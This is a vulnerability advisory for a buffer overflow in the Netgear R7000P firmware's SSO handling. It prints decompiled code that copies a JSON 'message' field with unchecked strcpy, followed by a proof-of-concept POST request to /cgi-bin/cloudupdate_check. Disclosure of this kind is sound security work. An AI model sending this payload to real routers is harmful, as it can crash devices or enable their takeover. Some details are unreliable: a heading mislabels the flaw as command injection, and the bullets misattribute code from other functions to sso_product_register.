# Buffer Overflow Vulnerability in SSO Functions

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R7000P Router                                        |
| Firmware Version     | V1.3.1.64_10.1.36                                            |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `libacos_shared.so` (`sso_product_register`, `sso_authentication`, `sso_registration`) |
| Prerequisites        | No authentication required; attacker must supply crafted JSON input containing `"message"` fields |

2. Exploitation Path

```c
int __fastcall sso_product_register(int a1, char *s)
{
  ...
  memset(s, 0, 0x98u);
  strcpy(s, "0");
  ...
  if ( v4 )
  {
    ObjectItem = j_cJSON_GetObjectItem(v4, "error");
    if ( ObjectItem )
    {
      ...
      v11 = j_cJSON_GetObjectItem(ObjectItem, "message");
      v12 = v11;
      if ( v11 && *(_DWORD *)(v11 + 12) == 4 )
      {
        sprintf(v22, "[BitDefender] SSO_API_PRODUCTREGISTER message:%s", *(_DWORD *)(v11 + 16));
        v17 = strlen(v22);
        j_ambitWriteLog(v22, v17, 67108903);
        printf("message:[%s]\n", *(_DWORD *)(v12 + 16));
        strcpy(s + 24, *(const char **)(v12 + 16));
      }
      ...
}
    
int __fastcall sso_authentication(const char *a1, char *s)
{
  ...
  memset(s, 0, 0x98u);
  ...
  if ( ObjectItem )
  {
    ...
    v26 = j_cJSON_GetObjectItem(ObjectItem, (int)"message");
    v27 = v26;
    if ( v26 && *(_DWORD *)(v26 + 12) == 4 )
    {
      sprintf(v38, "[BitDefender] SSO_API_AUTHENTICATION message:%s", *(_DWORD *)(v26 + 16));
      v31 = strlen(v38);
      j_ambitWriteLog(v38, v31, 67108903);
      printf("message:[%s]\n", *(_DWORD *)(v27 + 16));
      strcpy(s + 24, *(const char **)(v27 + 16));
    }
    ...
  if ( *(_DWORD *)(v10 + 20) != 200 )
  {
    v32 = j_cJSON_GetObjectItem(v8, (int)"message");
    v33 = v32;
    if ( v32 && *(_DWORD *)(v32 + 12) == 4 )
    {
      printf("message:[%s]\n", *(_DWORD *)(v32 + 16));
      strcpy(s + 24, *(const char **)(v33 + 16));
    }
    ...
}
    
int __fastcall sso_registration(int a1, char *s)
{
  ...
  memset(s, 0, 0x98u);
  strcpy(s, "0");
  ...
  if ( v6 )
  {
    ObjectItem = j_cJSON_GetObjectItem(v6, (int)"error");
    if ( ObjectItem )
    {
      ...
      v33 = j_cJSON_GetObjectItem(ObjectItem, (int)"message");
      v34 = v33;
      if ( v33 && *(_DWORD *)(v33 + 12) == 4 )
      {
        sprintf(v44, "[BitDefender] SSO_API_REGISTRATION message:%s", *(_DWORD *)(v33 + 16));
        v39 = strlen(v44);
        j_ambitWriteLog(v44, v39, 67108903);
        printf("message:[%s]\n", *(_DWORD *)(v34 + 16));
        strcpy(s + 24, *(const char **)(v34 + 16));
      }
      ...
    }
    else
    {
      v9 = j_cJSON_GetObjectItem(v7, (int)"meta");
      v10 = v9;
      if ( v9 )
      {
        v11 = j_cJSON_GetObjectItem(v9, (int)"message");
        v12 = v11;
        if ( v11 && *(_DWORD *)(v11 + 12) == 4 )
        {
          printf("message:[%s]\n", *(_DWORD *)(v11 + 16));
          strcpy(s + 24, *(const char **)(v12 + 16));
        }
        ...
}
```

3. **Vulnerable Binaries:** `cloudupdate_check`.

4. 0-Day Command Injection Exploitation Path:

   - In function `sso_product_register`, line 13 executes `v11 = j_cJSON_GetObjectItem(ObjectItem, "message")`. No length validation is performed, and the data is directly copied at line 21 via `strcpy(s + 24, *(const char **)(v12 + 16))`, resulting in a buffer overflow vulnerability.

   - In function `sso_product_register`, line 34 executes `v26 = j_cJSON_GetObjectItem(ObjectItem, (int)"message")`. No length validation is performed, and the data is directly copied at line 42 via `strcpy(s + 24, *(const char **)(v27 + 16))`, resulting in a buffer overflow vulnerability.

   - In function `sso_product_register`, line 47 executes `v32 = j_cJSON_GetObjectItem(v8, (int)"message")`. No length validation is performed, and the data is directly copied at line 52 via `strcpy(s + 24, *(const char **)(v33 + 16))`, resulting in a buffer overflow vulnerability.

   - In function `sso_product_register`, line 69 executes `v33 = j_cJSON_GetObjectItem(ObjectItem, (int)"message")`. No length validation is performed, and the data is directly copied at line 77 via `strcpy(s + 24, *(const char **)(v34 + 16))`, resulting in a buffer overflow vulnerability.

   - In function `sso_product_register`, line 87 executes `v11 = j_cJSON_GetObjectItem(v9, (int)"message")`. No length validation is performed, and the data is directly copied at line 92 via `strcpy(s + 24, *(const char **)(v12 + 16))`, resulting in a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/cloudupdate_check HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/json
Content-Length: 300
Connection: close

{
  "error": {
    "message": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
  }
}
```